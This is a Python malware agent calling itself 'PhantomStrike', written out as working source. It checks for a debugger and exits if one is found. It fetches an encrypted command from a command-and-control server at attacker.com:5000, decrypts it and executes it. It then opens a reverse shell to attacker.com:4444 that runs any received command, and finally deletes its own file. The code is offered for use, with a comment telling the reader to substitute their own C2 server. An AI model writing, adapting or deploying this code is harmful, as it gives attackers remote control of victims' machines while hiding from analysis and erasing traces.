import socket
import os
import time
import base64
import subprocess
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests

# Suppress warnings
import warnings
warnings.filterwarnings("ignore", category=UserWarning, module='requests')

# ASCII Art Banner
ascii_art = r"""
██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗  
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝  
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
              PhantomStrike - Malware Agent
"""
print(ascii_art)

# AES Decryption
key = b'SixteenByteKeyXX'
cipher = AES.new(key, AES.MODE_CBC)

def decrypt_data(data):
    encrypted_data = base64.b64decode(data)
    iv = encrypted_data[:16]
    ciphertext = encrypted_data[16:]
    dec_cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(dec_cipher.decrypt(ciphertext), AES.block_size).decode()

# Anti-Debugging & Self-Delete
def anti_debug():
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if "TracerPid:" in line and not line.endswith("\t0\n"):
                    logging.warning("Debugger detected, exiting...")
                    exit(1)
    except:
        pass

def self_delete():
    time.sleep(3)
    os.remove(__file__)

# Reverse Shell
def reverse_shell():
    host = "attacker.com"  # Replace with your C2 server
    port = 4444
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        data = s.recv(1024)
        if data.decode().strip() == "exit":
            break
        output = subprocess.run(data.decode(), shell=True, capture_output=True)
        s.send(output.stdout)
    s.close()

# Main
if __name__ == "__main__":
    anti_debug()
    logging.basicConfig(filename="agent_log.txt", level=logging.INFO)
    
    # Get command from C2
    response = requests.post("http://attacker.com:5000/command", json={"command": "whoami"})
    encrypted_cmd = response.json()["command"]
    decrypted_cmd = decrypt_data(encrypted_cmd)
    
    # Execute received command
    result = subprocess.getoutput(decrypted_cmd)
    print(result)

    # Enable reverse shell
    reverse_shell()

    # Self-delete (optional)
    self_delete()
